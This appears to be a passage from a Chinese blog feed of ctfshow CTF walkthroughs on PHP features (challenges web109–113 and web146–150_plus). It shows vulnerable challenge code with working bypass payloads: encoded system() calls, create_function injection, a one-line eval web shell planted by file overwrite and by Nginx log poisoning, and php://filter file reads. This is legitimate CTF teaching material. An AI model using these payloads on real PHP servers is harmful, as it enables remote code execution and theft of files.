&quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三元运算符也没了, 继续换, 换成或, 然后继续用payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|</span><br></pre></td></tr></table></figure><p>还可以是以下的:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(&quot;return 1==phpinfo()||1;&quot;);</span><br><span class="line">?v1=1&amp;v2=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)||</span><br></pre></td></tr></table></figure><h2 id="web147"><a class="header-anchor" href="#web147">¶</a>web147</h2><ul><li>描述: RCE</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限制这个函数不能以数字, 字母和下划线开头, 然后这个函数的第一个参数是不可控的, 只能控制第二个参数</p><p>首先利用<a href="https://blog.csdn.net/xuaner8786/article/details/137606539?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240398016800213066504%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172240398016800213066504&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-137606539-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=php%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4&amp;spm=1018.2226.3001.4187">命名空间</a>绕过正则:</p><p><a href="https://paper.seebug.org/755/">关于&quot;\&quot;绕过正则题目-easy-function</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">ctf=\phpinfo# 这是不能执行的, 因为两个参数会报错</span><br></pre></td></tr></table></figure><p>然后利用<a href="https://blog.csdn.net/qq_63347711/article/details/128673190?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172240500816800226510140%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172240500816800226510140&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-128673190-null-null.142%5Ev100%5Epc_search_result_base6&amp;utm_term=php%E5%8C%BF%E5%90%8D%E5%87%BD%E6%95%B0&amp;spm=1018.2226.3001.4187">匿名函数</a>进行构造, <code>create_function()</code>代码注入</p><p>GET传入大括号对<code>if</code>语句进行闭合, 再跟上phpinfo();, 最后注释掉后面的部分即可</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240731141349659.png" alt="image-20240731141349659"></p><p>原理如下:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo 1;&#125;phpinfo();//&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 美化</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET: </span><br><span class="line">?show=&#125;system(&quot;tac f*&quot;);//</span><br><span class="line">POST:</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a class="header-anchor" href="#web148">¶</a>web148</h2><ul><li>描述: 什么是变量？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>异或和括号没过滤, 那就用web143异或的脚本改一下正则重新生成payload(肯定不是去调用函数了, 毕竟都有<code>eval</code>了)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure><h2 id="web149"><a class="header-anchor" href="#web149">¶</a>web149</h2><ul><li>描述: 你写的快还是我删的快？</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>扫描当前目录, 如果该目录下有除了<code>index.php</code>的文件则全部删除</li><li>文件写入操作</li><li>再次删除<code>index.php</code>外的所有文件</li></ol><p>那么只需要覆盖/替换<code>index.php</code>内容就可以了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?ctf=index.php</span><br><span class="line">POST:</span><br><span class="line">show=&lt;?php @eval($_POST[cmd]); ?&gt;</span><br></pre></td></tr></table></figure><p>然后就是命令执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">cmd=system(&quot;tac /ctfshow_fl0g_here.txt&quot;);</span><br></pre></td></tr></table></figure><h2 id="web150"><a class="header-anchor" href="#web150">¶</a>web150</h2><ul><li>描述: 对我们以前的内容进行了小结，我们文件上传系列再见！</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面那一大串都没用; 因为<code>$ctf</code>除了过滤冒号就没有任何过滤就可以进行包含, isVIP可以变量覆盖, 查看中间件发现有Nginx, 尝试日志包含</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent: &lt;?php @eval($_POST[cmd]); ?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">?isVIP=true</span><br><span class="line">POST:</span><br><span class="line">ctf=/var/log/nginx/access.log&amp;cmd=system(&quot;tac f*&quot;);</span><br></pre></td></tr></table></figure><h2 id="web150-plus"><a class="header-anchor" href="#web150-plus">¶</a>web150_plus</h2><ul><li>描述: 修复了非预期</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 这里经过出题人精心构造, 让你误以为是上面那个类的方法, 给你改回来了</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">        <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不给用日志包含了, 注意<code>__autoload</code>是独立的, 不属于CTFSHOW类</p><blockquote><p>在代码中新建一个对象，找不到对应的类的时候会调用<code>__autoload</code></p></blockquote><p>在程序中检查了<code>$__CTFSHOW__</code>是否存在, 所以肯定会调用<code>__autoload</code>, 现在只需要控制<code>$__CTFSHOW__</code>即可, 而前面刚好有个<code>extract($_GET);</code>, 先尝试利用</p><p>记得下划线绕过, 不过这里仅剩小数点了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure><p>发现成功执行, 然后搜索ctfshow就能发现flag</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
            <tag> RCE </tag>
            
            <tag> PHP </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_php特性_2</title>
      <link href="/article/ctfshow-webbasic-php-2/"/>
      <url>/article/ctfshow-webbasic-php-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>php特性</h1><hr><h2 id="web109"><a class="header-anchor" href="#web109">¶</a>web109</h2><ul><li>描述: 换个姿势</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只检查了v1和v2是否存在以及是否包含了字母, 随后就是eval执行命令: 创建一个名为<code>$v1</code>的类的实例并且调用名称为<code>$v2</code>的方法</p><p>这里我们可以利用魔术方法<code>__toString</code>和异常处理机制执行任意代码: 因为是<code>echo new class</code>, 将类当成字符串输出; 很多<strong>PHP内置类</strong>(如Exception, CachingIterator, ReflectionClass)都实现了<code>__toString</code></p><blockquote><p><a href="https://geek-docs.com/php/php-exception-handling/php-exception-class.html">Exception</a>, <a href="https://www.php.net/manual/zh/class.cachingiterator.php">CachingIterator</a>和<a href="https://www.php.net/manual/zh/class.reflectionclass.php">ReflectionClass</a>类的部分解释, 可以知道部分方法由<code>__toString</code>触发</p></blockquote><p>所以payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line">?v1=CachingIterator&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br><span class="line"># 问就是cat还得翻翻源码</span><br></pre></td></tr></table></figure><h2 id="web110"><a class="header-anchor" href="#web110">¶</a>web110</h2><ul><li>描述: 我报警了</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤基本剩下字母, 但是你说的对, 还是得用内置类: 利用FilesystemIterator获取指定目录下的所有文件(接受一个路径作为参数), 而获取当前路径的函数中, <code>getcwd</code>不需要参数, <code>getchwd</code>函数会返回当前工作目录</p><p>所以构造如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=FilesystemIterator&amp;v2=getcwd</span><br><span class="line"># 本目录下有fl36dga.txt</span><br></pre></td></tr></table></figure><p>没有后续了, 可以直接访问的</p><h2 id="web111"><a class="header-anchor" href="#web111">¶</a>web111</h2><ul><li>描述: 变量覆盖</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>显然<code>eval(&quot;$$v1 = &amp;$$v2;&quot;);</code>会出现变量覆盖问题, 但是要求<code>$v1</code>中包含字符串ctfshow才会调用, 所以只能构造<code>$v2</code></p><p>因为我们并不知道flag在哪个变量里面, 所以直接调用超全局变量<code>$GLOBALS</code>: <code>$GLOBALS</code>是PHP的一个超级全局变量组, 包含了全部变量的全局组合数组, 变量的名字就是数组的键</p><p>所以payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><blockquote><p>就算知道了, 可是flag是在flag.php中的, 对于<code>getFlag()</code>是外部变量, 还是不能直接赋值给<code>$ctfshow</code></p></blockquote><h2 id="web112"><a class="header-anchor" href="#web112">¶</a>web112</h2><ul><li>描述: 函数绕过</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>is_file</code>函数用于检查指定的文件是否是常规的文件, 如果是, 则返回TRUE; 而既要通过<code>is_file</code>函数的检测, 还要通过<code>highlight_file</code>得到flag, 那只有伪协议读取文件</p><p>过滤了一些过滤器, 那就不使用过滤器, payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><p>或者塞一些正则匹配之外的过滤器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>官方还给了一种伪协议:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">他人博客</a>解析</p><h2 id="web113"><a class="header-anchor" href="#web113">¶</a>web113</h2><ul><li>描述: 函数绕过</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span 